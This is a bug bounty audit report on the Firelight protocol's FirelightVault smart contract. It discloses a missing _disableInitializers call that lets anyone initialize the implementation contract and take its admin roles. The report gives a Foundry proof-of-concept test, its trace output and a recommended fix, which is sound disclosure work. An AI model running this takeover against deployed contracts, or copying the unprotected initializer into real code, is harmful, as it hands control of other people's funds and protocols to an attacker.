# #58992 \[SC-Low] the firelightvault contract doesn t call disableinitializers in its construcotor

**Submitted on Nov 7th 2025 at 15:09:03 UTC by @EagleEye for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight)

* **Report ID:** #58992
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/firelight-protocol/firelight-core/blob/main/contracts/FirelightVault.sol>
* **Impacts:**

## Description

## Brief/Intro

The `FirelightVault` contract is an ERC4626Upgradeable vault and has an `initialize` function, but doesn't have a constructor that calls the `_disableInitializers` function. This omission allows the implementation contract to be initialized by malicious user without using a proxy.

## Vulnerability Details

The `FirelightVault` contract doesn't call the `_disableInitializers` function in its constructor.

```
  function initialize(
        IERC20 _asset,
        string memory _name,
        string memory _symbol,
        bytes memory _initParams
    ) public initializer {
        InitParams memory initParams = abi.decode(_initParams, (InitParams));
        __ERC20_init(_name, _symbol);
        __ERC4626_init(_asset);
        __Pausable_init();
        __ReentrancyGuard_init();
        __AccessControl_init();

        if (address(_asset) == address(0)) {
            revert InvalidAssetAddress();
        }

        if (initParams.depositLimit == 0) {
            revert InvalidDepositLimit();
        }

        if (initParams.periodConfigurationDuration == 0) {
            revert InvalidPeriodConfigurationDuration();
        }
....
```

It has an `initialize` function that is intended to be called by the owner through proxy, but this omission allows the implementation contract to be initialized by malicious user without using a proxy.

## Impact Details

Malicious user gains the control over the protocol. The admin should redeploy the protocol.

## References

<https://github.com/firelight-protocol/firelight-core/blob/db36312f1fb24efc88c3fde15a760defbc3e6370/contracts/FirelightVault.sol#L146>

## Recommendation

Add a constructor that calls the `_disableInitializers` function.

## Proof of Concept

## Proof of Concept

Add a Foundry setup to the Hardhat project, using the steps in this link: <https://getfoundry.sh/config/hardhat/#adding-foundry-to-a-hardhat-project> Then you can execute the following test with command: `forge test --mt "testInitializeVault" -vvvvv`

The test shows that anyone can initialize the `FirelightVault` contract and gain the admin rights:

```

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";
import {StdInvariant} from "forge-std/StdInvariant.sol";
import {console} from "forge-std/console.sol";
//import FirelightVaultStorage from "../../src/FireLight/FirelightVaultStorage.sol";
import {FirelightVault} from "../../src/FireLight/FireLightVault.sol";
import {MockERC20} from "../MockERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract FireLightVaultTest is StdInvariant, Test {
    
    FirelightVault vault;
    MockERC20 asset;


    function setUp() public {
        vault = new FirelightVault();
        asset = new MockERC20("Mock DAI", "mDAI", 18);

    }

    function testInitializeVault() public {
        FirelightVault.InitParams memory params = FirelightVault.InitParams({
            defaultAdmin: address(this),
            limitUpdater: address(0x444),
            blocklister: address(0x5),
            pauser: address(0x6),
            periodConfigurationUpdater: address(0x7),
            depositLimit: 10_000_000 ether,
            periodConfigurationDuration: 30 days
        });

        bytes memory paramsEncoded = abi.encode(params);
        vault.initialize(IERC20(address(asset)), "Vault", "V", paramsEncoded);
    }
}
```

And the result:

```
[PASS] testInitializeVault() (gas: 349641)
Traces:
  [3758330] FireLightVaultTest::setUp()
    ├─ [3259611] → new FirelightVault@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← [Return] 16280 bytes of code
    ├─ [403071] → new MockERC20@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    │   └─ ← [Return] 1672 bytes of code
    └─ ← [Stop] 

  [349641] FireLightVaultTest::testInitializeVault()
    ├─ [340885] FirelightVault::initialize(MockERC20: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], "Vault", "V", 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000444000000000000000000000000000000000000000000000000000000000000000500000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000007000000000000000000000000000000000000000000084595161401484a0000000000000000000000000000000000000000000000000000000000000000278d00)
    │   ├─ [2402] MockERC20::decimals() [staticcall]
    │   │   └─ ← [Return] 18
    │   ├─ emit PeriodConfigurationAdded(periodConfiguration: PeriodConfiguration({ epoch: 1, duration: 2592000 [2.592e6], startingPeriod: 0 }))
    │   ├─ emit RoleGranted(role: 0x0000000000000000000000000000000000000000000000000000000000000000, account: FireLightVaultTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], sender: FireLightVaultTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─ emit RoleGranted(role: 0x7a239212a00ca755b79509a034715154386895f9f9e24abe8401e5b1b9a1a5a0, account: 0x0000000000000000000000000000000000000444, sender: FireLightVaultTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─ emit RoleGranted(role: 0xdef752f6ad59be9880423e079755189539de01983d091b3c097e4742fd9916d1, account: ModExp: [0x0000000000000000000000000000000000000005], sender: FireLightVaultTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─ emit RoleGranted(role: 0x139c2898040ef16910dc9f44dc697df79363da767d8bc92f2e310312b816e46d, account: ECAdd: [0x0000000000000000000000000000000000000006], sender: FireLightVaultTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─ emit RoleGranted(role: 0x6c6a5de61c8667e917ea675d182a58870b6de23041e69efc8e0465f7ef75e7b9, account: ECMul: [0x0000000000000000000000000000000000000007], sender: FireLightVaultTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─ emit Initialized(version: 1)
    │   └─ ← [Stop] 
    └─ ← [Stop] 
```
